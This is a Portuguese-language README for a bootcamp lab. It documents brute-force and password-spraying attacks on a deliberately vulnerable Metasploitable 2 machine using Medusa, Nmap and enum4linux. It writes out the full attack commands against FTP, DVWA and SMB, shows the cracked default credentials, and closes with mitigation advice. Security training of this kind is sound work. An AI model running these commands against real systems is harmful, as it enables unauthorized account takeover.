# 🛡️ **Kali Linux — Medusa Brute Force Lab**

*Simulações práticas de ataques de força bruta e password spraying em ambiente controlado*

---

## 📌 **Descrição do Projeto**

Este repositório documenta um laboratório completo de **segurança ofensiva** utilizando:

* **Kali Linux** (atacante)
* **Metasploitable 2** (alvo vulnerável)
* **Medusa** (ferramenta de força bruta)

Os objetivos do projeto incluem:

* Executar ataques de **brute force** contra serviços vulneráveis
* Simular **login automation** em aplicações Web (DVWA)
* Realizar **password spraying** em **SMB**
* Documentar etapas, evidências e recomendações de segurança
* Demonstrar domínio prático de cibersegurança para portfólio técnico

---

## 🧩 **Arquitetura do Ambiente**

```
+---------------------+               +------------------------------+
|      Kali Linux     |               |       Metasploitable 2       |
|  (Atacante / Kali)  |   Host-Only   |  (Máquina Vulnerável)        |
|  Medusa, Nmap, etc  | <-----------> |  FTP, DVWA, SMB, Serviços    |
+---------------------+   Network     +------------------------------+
```

* **Rede:** Host-Only
* **Kali Linux:** ferramentas de ataque
* **Metasploitable:** ambiente inseguro para testes

O endereço IP do alvo (`<TARGET_IP>`) deve ser ajustado conforme o seu ambiente.
Neste laboratório, o IP utilizado foi **192.168.0.3**.

---

## 📁 **Estrutura do Repositório**

```
/
├── evidence/        # Saída real dos ataques (Medusa, Nmap, Enum4linux)
├── images/          # Prints das etapas para documentação
├── report/          # Relatório técnico final
├── wordlists/       # Wordlists customizadas para os ataques
├── commands.md      # Todos os comandos utilizados no lab
└── README.md        # Este arquivo
```

---

# 🔎 **1. Enumeração Inicial com Nmap**

O primeiro passo foi identificar portas e serviços expostos.

### Comando utilizado:

```bash
nmap -sS -sV -O -p- <TARGET_IP> -oN evidence/nmap_full.txt
```

### Resultados importantes:

| Porta         | Serviço             | Descrição                 |
| ------------- | ------------------- | ------------------------- |
| **21**        | FTP                 | Vulnerável (vsftpd 2.3.4) |
| **80**        | HTTP                | Apache + DVWA             |
| **139/445**   | SMB                 | Samba 3.0.20 (fraco)      |
| Várias outras | Telnet, MySQL, etc. | Alta superfície de ataque |

---

# 🔐 **2. Ataque de Força Bruta em FTP**

Wordlist personalizada em `wordlists/small-passwords.txt`.

### Comando:

```bash
medusa -h <TARGET_IP> -u ftp -P wordlists/small-passwords.txt -M ftp -f \
       -O evidence/ftp_medusa_output.txt
```

### ✔ Resultado:

**Acesso encontrado:**

```
User: ftp
Password: 123456
```

---

# 🌐 **3. Brute Force Web (DVWA) — Módulo HTTP**

O DVWA utiliza token anti-CSRF no login.
Por isso, o ataque foi executado usando o módulo **HTTP genérico** do Medusa.

### Comando:

```bash
medusa -h <TARGET_IP> \
       -u admin \
       -P wordlists/small-passwords.txt \
       -M http \
       -m DIR:/dvwa/ \
       -O evidence/dvwa_http_output.txt
```

### ✔ Resultado:

```
User: admin
Password: 123456
```

O ataque foi bem-sucedido com identificação automática baseada na resposta HTTP.

---

# 📁 **4. Enumeração SMB (Samba)**

### Comando:

```bash
enum4linux -a <TARGET_IP> | tee evidence/enum4linux_output.txt
```

### Pontos críticos:

* SMB com **sessão anônima habilitada**
* Política extremamente frágil:

  * Senha mínima: **0**
  * Complexidade: **desativada**
  * Sem bloqueio por tentativas

---

# 💥 **5. Password Spraying SMB**

Utilizando lista ampliada de usuários e senhas comuns.

### Comando final:

```bash
medusa -h <TARGET_IP> \
       -U wordlists/users.txt \
       -P wordlists/common-passwords.txt \
       -M smbnt \
       -m DOMAIN:WORKGROUP \
       -f \
       -O evidence/smb_medusa_output.txt
```

### ✔ Resultado alcançado:

```
ACCOUNT FOUND: [smbnt]
User: msfadmin
Password: msfadmin
Access Allowed: ADMIN$
```

Esse é um dos resultados mais críticos do laboratório:
**Credenciais válidas com acesso administrativo ao SMB.**

---

# 🛡️ **Recomendações de Mitigação**

* Remover contas padrão (`msfadmin`, `user`, `postgres`)
* Habilitar política forte de senhas
* Desativar login anônimo no SMB
* Desabilitar compartilhamentos administrativos (`ADMIN$`)
* Restringir SMB à rede interna
* Implementar bloqueio após tentativas de login
* Manter serviços atualizados (Samba 3.x é extremamente vulnerável)

---

# 📚 **Conclusão**

Este laboratório demonstra:

✔ como conduzir testes de força bruta com Medusa
✔ como identificar credenciais fracas em múltiplos serviços
✔ como explorar vetores de ataque reais em um ambiente vulnerável
✔ como documentar a operação com evidências e boas práticas

O projeto foi elaborado como parte do Bootcamp **Santander Cybersegurança 2025** (DIO), com foco em práticas reais de segurança ofensiva utilizando ferramentas profissionais.

---

# 🏆 **Créditos**

Projeto desenvolvido por **Matheus Santos Caldas**, utilizando as seguintes ferramentas:

* Kali Linux
* Medusa
* Nmap
* Enum4linux
* DVWA
* Metasploitable 2